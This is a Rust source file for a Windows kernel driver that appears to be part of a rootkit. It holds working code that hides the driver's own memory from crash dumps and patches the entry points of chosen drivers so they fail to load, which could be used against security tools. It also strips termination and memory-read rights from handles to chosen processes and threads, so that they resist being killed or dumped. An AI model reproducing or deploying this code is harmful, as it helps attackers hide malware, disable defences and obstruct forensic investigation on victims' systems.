#![cfg_attr(not(feature = "mapper"), allow(non_snake_case))]

use core::{
    ffi::c_void,
    ptr::{null_mut, addr_of_mut}
};

use alloc::{string::String, vec::Vec};
use spin::{lazy::Lazy, mutex::Mutex};
use wdk_sys::{
    ntddk::*, *,
    _KBUGCHECK_CALLBACK_REASON::KbCallbackRemovePages,
};

use shadowx::{uni, IMAGE_DOS_HEADER, IMAGE_NT_HEADERS, mdl::Mdl};
use shadowx::{
    KBUGCHECK_REASON_CALLBACK_RECORD, 
    KeRegisterBugCheckReasonCallback,
    KeDeregisterBugCheckReasonCallback
};

use shadowx::registry::callback::{
    CALLBACK_REGISTRY, 
    registry_callback
};

/// Stores the `KBUGCHECK_REASON_CALLBACK_RECORD` instance.
pub static mut BUG_CHECK: KBUGCHECK_REASON_CALLBACK_RECORD = unsafe { core::mem::zeroed() };

/// Stores the base address of the driver.
pub static mut DRIVER_BASE: *mut c_void = null_mut();

/// Stores the driver size in memory.
pub static mut DRIVER_SIZE: u32 = 0;

/// Struct for managing callback registration.
pub struct Callback<'a> {
    driver: &'a mut DRIVER_OBJECT
}

impl<'a> Callback<'a> {
    /// Creates a new callback manager.
    pub fn new(driver: &'a mut DRIVER_OBJECT) -> Self {
        Self { driver }
    }

    /// Registers all callbacks and validates their success.
    /// 
    /// Returns `STATUS_SUCCESS` if all registrations succeed, otherwise `STATUS_UNSUCCESSFUL`.
    pub fn register(&mut self) -> NTSTATUS {
        if !self.bug_check() 
            || !NT_SUCCESS(self.process()) 
            || !NT_SUCCESS(self.thread())
            || !NT_SUCCESS(self.registry())
            || !NT_SUCCESS(self.image())
        {
            return STATUS_UNSUCCESSFUL;
        }

        STATUS_SUCCESS
    }  

    /// Registers the BugCheck (crash dump) callback.
    #[inline(always)]
    fn bug_check(&self) -> bool {
        unsafe {
            let module = c"ShadowBugCheck";
            BUG_CHECK.State = 0;
            KeRegisterBugCheckReasonCallback(
                &mut BUG_CHECK, 
                Some(bug_check_remove_pages), 
                KbCallbackRemovePages, 
                module.as_ptr().cast_mut().cast()
            ) != 0
        }
    }

    /// Registers callbacks for thread operations.
    fn thread(&self) -> NTSTATUS {
        // Creating callbacks related to thread operations
        let altitude = uni::str_to_unicode("31243.5223");
        let mut op_reg = OB_OPERATION_REGISTRATION {
            ObjectType: unsafe { PsThreadType },
            Operations: OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
            PreOperation: Some(thread::on_pre_open_thread),
            PostOperation: None,
        };
        
        let mut cb_reg = OB_CALLBACK_REGISTRATION {
            Version: OB_FLT_REGISTRATION_VERSION as u16,
            OperationRegistrationCount: 1,
            Altitude: altitude.to_unicode(),
            RegistrationContext: null_mut(),
            OperationRegistration: &mut op_reg,
        };

        let status = unsafe { ObRegisterCallbacks(&mut cb_reg, addr_of_mut!(CALLBACK_REGISTRATION_HANDLE_THREAD)) };
        if !NT_SUCCESS(status) {
            log::error!("ObRegisterCallbacks [{}] Failed With Status: {}", line!(), status);
        }

        status
    }

    /// Registers callbacks for process operations.
    fn process(&self) -> NTSTATUS {
        let altitude = uni::str_to_unicode("31243.5222");
        let mut op_reg = OB_OPERATION_REGISTRATION {
            ObjectType: unsafe { PsProcessType },
            Operations: OB_OPERATION_HANDLE_CREATE | OB_OPERATION_HANDLE_DUPLICATE,
            PreOperation: Some(process::on_pre_open_process),
            PostOperation: None,
        };

        let mut cb_reg = OB_CALLBACK_REGISTRATION {
            Version: OB_FLT_REGISTRATION_VERSION as u16,
            OperationRegistrationCount: 1,
            Altitude: altitude.to_unicode(),
            RegistrationContext: null_mut(),
            OperationRegistration: &mut op_reg,
        };

        let status = unsafe { ObRegisterCallbacks(&mut cb_reg, addr_of_mut!(CALLBACK_REGISTRATION_HANDLE_PROCESS)) };
        if !NT_SUCCESS(status) {
            log::error!("ObRegisterCallbacks [{}] Failed With Status: {}", line!(), status);
        }

        status
    }

    /// Registers callbacks for registry operations.
    fn registry(&mut self) -> NTSTATUS {
        // Creating callbacks related to registry operations
        let altitude = uni::str_to_unicode("31422.6172").to_unicode();
        let status = unsafe { 
            CmRegisterCallbackEx(
                Some(registry_callback),
                &altitude,
                self.driver as *mut DRIVER_OBJECT as *mut c_void,
                null_mut(),
                addr_of_mut!(CALLBACK_REGISTRY),
                null_mut(),
            ) 
        };

        if !NT_SUCCESS(status) {
            log::error!("CmRegisterCallbackEx Failed With Status: {status}");
        }

        status
    }

    /// Registers an image load notification routine.
    fn image(&self) -> NTSTATUS {
        unsafe { PsSetLoadImageNotifyRoutine(Some(image_notify_routine)) }
    }

    /// Unloads the driver and unregisters all active callbacks.
    pub fn unload() {
        unsafe {
            // Unregister process and thread creation callbacks
            ObUnRegisterCallbacks(CALLBACK_REGISTRATION_HANDLE_PROCESS);
            ObUnRegisterCallbacks(CALLBACK_REGISTRATION_HANDLE_THREAD);
    
            // Unregister registry modification callback
            CmUnRegisterCallback(CALLBACK_REGISTRY);
    
            // Unregister bug check (crash dump) callback
            KeDeregisterBugCheckReasonCallback(&mut BUG_CHECK);
    
            // Unregister image load notification callback
            PsRemoveLoadImageNotifyRoutine(Some(image_notify_routine));
        }
    }
}

/// Callback function triggered during a system crash (bug check).
///
/// This function modifies the crash dump behavior by marking specific memory
/// regions to be removed from the crash dump.
extern "C" 
fn bug_check_remove_pages(
    _Reason: KBUGCHECK_CALLBACK_REASON,
    _Record: *mut KBUGCHECK_REASON_CALLBACK_RECORD,
    ReasonSpecificData: *mut c_void,
    _ReasonSpecificDataLength: u32,
) {
    unsafe {
        // Validate parameters
        if ReasonSpecificData.is_null() || DRIVER_BASE.is_null() || DRIVER_SIZE == 0 {
            log::error!("Invalid Parameters");
            return;
        }

        // Modify crash dump to remove specific pages
        let dump_data = ReasonSpecificData as *mut KBUGCHECK_REMOVE_PAGES;
        (*dump_data).Address = DRIVER_BASE as u64;
        (*dump_data).Count = ((DRIVER_SIZE >> PAGE_SHIFT) + ((DRIVER_SIZE & (PAGE_SIZE - 1)) != 0) as u32) as u64;
        (*dump_data).Flags = KB_REMOVE_PAGES_FLAG_VIRTUAL_ADDRESS;
    }
}

// Opcodes that will be entered to prevent the driver from being loaded
const OPCODES: [u8; 6] = [
    0xB8, 0x01, 0x00, 0x00, 0xC0, // mov eax, 0xC0000001 (STATUS_UNSUCCESSFUL)
	0xC3                         // ret
];

// Maximum number of drivers that can be protected
const MAX_DRIVER: usize = 256;

/// List of drivers to block.
static TARGET_DRIVERS: Lazy<Mutex<Vec<String>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_DRIVER)));

/// Callback function triggered when an image (executable/DLL) is loaded.
///
/// This function intercepts image loading events and checks for images. 
/// If detected, it modifies the image's entry point using an MDL (Memory Descriptor List).
extern "C"
fn image_notify_routine(
    FullImageName: PUNICODE_STRING,
    ProcessId: HANDLE,
    ImageInfo: PIMAGE_INFO,
) {
    unsafe {
        // Ensure the image is valid and avoid processing for kernel processes
        if (*ImageInfo).ImageBase.is_null() || ProcessId as usize != 0 {
            return;
        }

        // Convert the image name from UTF-16 to a Rust string
        let buffer = core::slice::from_raw_parts(
            (*FullImageName).Buffer,
            ((*FullImageName).Length / 2) as usize,
        );
        
        // Check if the loaded image is the target
        let image_name = String::from_utf16_lossy(buffer);
        let drivers = TARGET_DRIVERS.lock();
        if !drivers.iter().any(|d| image_name.contains(d)) {
            return;
        }

        // Locate the entry point of the image
        let nt_header = ((*((*ImageInfo).ImageBase as *const IMAGE_DOS_HEADER)).e_lfanew as usize + (*ImageInfo).ImageBase as usize) as *const IMAGE_NT_HEADERS;
        let entry_point = ((*ImageInfo).ImageBase as usize + (*nt_header).OptionalHeader.AddressOfEntryPoint as usize) as *mut u8;

        // Use MDL to safely modify the memory at the entry point
        if let Some(mdl) = Mdl::new(entry_point, size_of_val(&OPCODES)) {
            mdl.copy(OPCODES.as_ptr(), size_of_val(&OPCODES));
        } else {
            log::error!("MDL initialization failed.");
        }
    }
}

pub mod driver {
    use super::{TARGET_DRIVERS, MAX_DRIVER};
    use alloc::string::String;
    use wdk_sys::{
        NTSTATUS, STATUS_DUPLICATE_OBJECTID, 
        STATUS_QUOTA_EXCEEDED, STATUS_SUCCESS, 
        STATUS_UNSUCCESSFUL
    };

    /// Adds a driver to the list.
    ///
    /// # Arguments
    ///
    /// * `driver` - A string to the driver name.
    ///
    /// # Returns
    ///
    /// * A status code indicating the success or failure of the operation.
    pub fn add_driver(driver: String) -> NTSTATUS {
        let mut drivers = TARGET_DRIVERS.lock();

        if drivers.len() >= MAX_DRIVER {
            return STATUS_QUOTA_EXCEEDED;
        }

        if drivers.contains(&driver) {
            return STATUS_DUPLICATE_OBJECTID;
        }

        drivers.push(driver);

        STATUS_SUCCESS
    }

    /// Removes a driver from the list.
    ///
    /// # Arguments
    ///
    /// * `driver` - A string reference to the driver name.
    ///
    /// # Returns
    ///
    /// * A status code indicating the success or failure of the operation.
    pub fn remove_driver(driver: &String) -> NTSTATUS {
        let mut drivers = TARGET_DRIVERS.lock();

        if let Some(index) = drivers.iter().position(|x| x == driver) {
            drivers.remove(index);
            STATUS_SUCCESS
        } else {
            STATUS_UNSUCCESSFUL
        }
    }
}

// Maximum Pids
const MAX_PID: usize = 100;

/// Handle for the process callback registration.
pub static mut CALLBACK_REGISTRATION_HANDLE_PROCESS: *mut core::ffi::c_void = core::ptr::null_mut();

/// List of target PIDs protected by a mutex.
static TARGET_PIDS: Lazy<Mutex<Vec<usize>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_PID)));

pub mod process {
    use alloc::vec::Vec;
    use super::TARGET_PIDS;
    use common::structs::TargetProcess;
    use wdk_sys::ntddk::PsGetProcessId;
    use wdk_sys::_OB_PREOP_CALLBACK_STATUS::{Type, OB_PREOP_SUCCESS};
    use wdk_sys::*;
    use shadowx::{
        PROCESS_CREATE_THREAD, PROCESS_TERMINATE, 
        PROCESS_VM_OPERATION, PROCESS_VM_READ,
    };

    /// Method for adding the list of processes that will have anti-kill / dumping protection.
    ///
    /// # Arguments
    ///
    /// * `pid` - The identifier of the target process (PID) to be hidden.
    ///
    /// # Returns
    ///
    /// * A status code indicating the success or failure of the operation.
    pub fn add_pid(pid: usize) -> NTSTATUS {
        let mut pids = TARGET_PIDS.lock();

        if pids.len() >= super::MAX_PID {
            return STATUS_QUOTA_EXCEEDED;
        }

        if pids.contains(&pid) {
            return STATUS_DUPLICATE_OBJECTID;
        }

        pids.push(pid);

        STATUS_SUCCESS
    }

    /// Method for removing the list of processes that will have anti-kill / dumping protection.
    ///
    /// # Arguments
    ///
    /// * `pid` - The identifier of the target process (PID) to be hidden.
    ///
    /// # Returns
    ///
    /// * A status code indicating the success or failure of the operation.
    pub fn remove_pid(pid: usize) -> NTSTATUS {
        let mut pids = TARGET_PIDS.lock();

        if let Some(index) = pids.iter().position(|&x| x == pid) {
            pids.remove(index);
            STATUS_SUCCESS
        } else {
            STATUS_UNSUCCESSFUL
        }
    }

    /// Enumerate Processes Protect.
    ///
    /// # Returns
    ///
    /// * A status code indicating success or failure of the operation.
    pub unsafe fn enumerate_protection_processes() -> Vec<TargetProcess> {
        let mut processes: Vec<TargetProcess> = Vec::new();
        let process_info = TARGET_PIDS.lock();
        for i in process_info.iter() {
            processes.push(TargetProcess {
                pid: *i,
                ..Default::default()
            });
        }

        processes
    }

    /// The object (process) pre-operation callback function used to filter process opening operations.
    /// This function is registered as a callback and is called by the operating system before a process opening operation is completed.
    ///
    /// # Arguments
    ///
    /// * `_registration_context` - Pointer to record context (Not used).
    /// * `info` - Pointer to an `OB_PRE_OPERATION_INFORMATION` structure that contains information about the process's pre-opening operation.
    ///
    /// # Returns
    ///
    /// * A status code indicating the success or failure of the operation.
    pub unsafe extern "C" 
    fn on_pre_open_process(
        _registration_context: *mut core::ffi::c_void,
        info: *mut OB_PRE_OPERATION_INFORMATION,
    ) -> Type {
        if (*info).__bindgen_anon_1.__bindgen_anon_1.KernelHandle() == 1 {
            return OB_PREOP_SUCCESS;
        }

        let process = (*info).Object as PEPROCESS;
        let pid = PsGetProcessId(process) as usize;
        let pids = TARGET_PIDS.lock();

        if pids.contains(&pid) {
            let mask = !(PROCESS_VM_OPERATION
                | PROCESS_VM_READ
                | PROCESS_CREATE_THREAD
                | PROCESS_DUP_HANDLE
                | PROCESS_TERMINATE);
                
            (*(*info).Parameters).CreateHandleInformation.DesiredAccess &= mask;
        }

        OB_PREOP_SUCCESS
    }
}

// Maximum TIDS
const MAX_TID: usize = 100;

/// Handle for the thread callback registration.
pub static mut CALLBACK_REGISTRATION_HANDLE_THREAD: *mut core::ffi::c_void = core::ptr::null_mut();

/// List of the target TIDs
static TARGET_TIDS: Lazy<Mutex<Vec<usize>>> = Lazy::new(|| Mutex::new(Vec::with_capacity(MAX_TID)));

pub mod thread {
    use wdk_sys::ntddk::PsGetThreadId;
    use wdk_sys::_OB_PREOP_CALLBACK_STATUS::{Type, OB_PREOP_SUCCESS};
    use wdk_sys::*;
    use super::TARGET_TIDS;

    use {
        alloc::vec::Vec,
        common::structs::TargetThread,
    };    
    
    /// Method for adding the list of threads that will have anti-kill / dumping protection.
    ///
    /// # Arguments
    ///
    /// * `tid` - The identifier of the target process (tid) to be hidden.
    ///
    /// # Returns
    ///
    /// * A status code indicating the success or failure of the operation.
    pub fn add_target_tid(tid: usize) -> NTSTATUS {
        let mut tids = TARGET_TIDS.lock();

        if tids.len() >= super::MAX_TID {
            return STATUS_QUOTA_EXCEEDED;
        }

        if tids.contains(&tid) {
            return STATUS_DUPLICATE_OBJECTID;
        }

        tids.push(tid);

        STATUS_SUCCESS
    }

    /// Method for removing the list of threads that will have anti-kill / dumping protection.
    ///
    /// # Arguments
    ///
    /// * `tid` - The identifier of the target process (tid) to be hidden.
    ///
    /// # Returns
    ///
    /// * A status code indicating the success or failure of the operation.
    pub fn remove_target_tid(tid: usize) -> NTSTATUS {
        let mut tids = TARGET_TIDS.lock();

        if let Some(index) = tids.iter().position(|&x| x == tid) {
            tids.remove(index);
            STATUS_SUCCESS
        } else {
            STATUS_UNSUCCESSFUL
        }
    }

    /// Enumerate threads Protect.
    ///
    /// # Arguments
    ///
    /// * `info_process` - It is a parameter of type `Infothreads` that will send the threads that are currently protected.
    /// * `information` - It is a parameter of type `usize` that will be updated with the total size of the filled `Infothreads` structures.
    ///
    /// # Returns
    ///
    /// * A status code indicating success or failure of the operation.
    pub unsafe fn enumerate_protection_thread() -> Vec<TargetThread> {
        let mut threads: Vec<TargetThread> = Vec::new();
        let thread_info = TARGET_TIDS.lock();
        for i in thread_info.iter() {
            threads.push(TargetThread {
                tid: *i,
                ..Default::default()
            });
        }

        threads
    }

    /// Pre-operation callback for thread opening that modifies the desired access rights to prevent certain actions on specific threads.
    ///
    /// # Arguments
    ///
    /// * `_registration_context` - A pointer to the registration context (unused).
    /// * `info` - A pointer to the `OB_PRE_OPERATION_INFORMATION` structure containing information about the operation.
    ///
    /// # Returns
    ///
    /// * A status code indicating the success of the pre-operation.
    pub unsafe extern "C" 
    fn on_pre_open_thread(
        _registration_context: *mut core::ffi::c_void,
        info: *mut OB_PRE_OPERATION_INFORMATION,
    ) -> Type {
        if (*info).__bindgen_anon_1.__bindgen_anon_1.KernelHandle() == 1 {
            return OB_PREOP_SUCCESS;
        }

        let thread = (*info).Object as PETHREAD;
        let tid = PsGetThreadId(thread) as usize;
        let tids = TARGET_TIDS.lock();

        if tids.contains(&tid) {
            let mask = !(THREAD_TERMINATE
                | THREAD_SUSPEND_RESUME
                | THREAD_GET_CONTEXT
                | THREAD_SET_CONTEXT);
            
            (*(*info).Parameters).CreateHandleInformation.DesiredAccess &= mask;
        }

        OB_PREOP_SUCCESS
    }
}
